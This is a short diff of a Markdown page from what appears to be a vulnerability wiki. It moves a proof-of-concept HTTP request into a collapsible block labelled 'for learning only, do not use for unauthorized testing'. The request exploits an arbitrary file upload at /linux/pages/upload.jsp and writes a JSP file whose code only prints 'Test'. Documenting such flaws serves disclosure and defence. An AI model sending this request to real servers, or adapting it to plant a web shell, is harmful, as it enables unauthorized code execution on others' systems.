@@ -33,15 +33,18 @@ tags:
 
 poc
 
-```
-POST /linux/pages/upload.jsp HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /linux/pages/upload.jsp HTTP/1.1
 Host: 
 Content-Type: application/x-www-form-urlencoded
 filename: Test.jsp
 Accept-Encoding: gzip
 
-<% out.println("Test");%>
-```
+&lt;% out.println("Test");%&gt;</code></pre>
+
+</details>
 
 ![image-20231116141354722](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116141354722.png)
 
